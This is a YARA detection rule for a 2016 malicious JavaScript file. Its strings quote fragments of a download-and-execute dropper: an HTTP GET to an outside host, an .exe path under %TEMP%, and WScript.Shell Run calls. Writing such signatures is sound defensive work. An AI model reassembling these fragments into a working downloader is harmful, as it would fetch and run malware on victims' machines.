rule sig_20160329_2ddf5fce6bb3806a205b94f57e09c792 {
  meta:
    description = "datamaliciousorder - file 20160329_2ddf5fce6bb3806a205b94f57e09c792.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0182560ec7b657cf70b9bc5d43de99ad027235a0e6bed858096a7468b777ad15"

  strings:
    $s1  = "Gr[Qb](\"GET\", \"http://hiddenhandbags.com/kdk4a\", false);" fullword ascii
    $s2  = "function vN() {return o[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"75WlzRfM.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[y](O() * 11); if (Gr[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Xs(k, w){M = M * 1; return k - w;};" fullword ascii
    $s5  = "var o = function s() {return WScript[Ly](\"WScript.Shell\");}(), ha = 11;" fullword ascii
    $s6  = "function Bb(){return \"\" + l;};" fullword ascii
    $s7  = "function E() {return ((j == true) && (j == j0)) ? 1 : M;};" fullword ascii
    $s8  = "function fK(PR){o[\"Run\"](PR, M, M);};" fullword ascii
    $s9  = "function O(){return 22;};" fullword ascii
    $s10 = "function J(s0) {var Nn = (1, 2, 3, 4, 5, s0); return Nn;};" fullword ascii
    $s11 = "return Xs(RP, sD);" fullword ascii
    $s12 = "function Gc(){return Ly;};" fullword ascii
    $s13 = "var P = new this[\"Date\"]();" fullword ascii
    $s14 = "function iG()" fullword ascii
    $s15 = " while (eI){" fullword ascii
    $s16 = "var j = false;" fullword ascii
    $s17 = "j = true; " fullword ascii
    $s18 = "var SB = false;" fullword ascii
    $s19 = "var j0 = false;" fullword ascii
    $s20 = "j0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}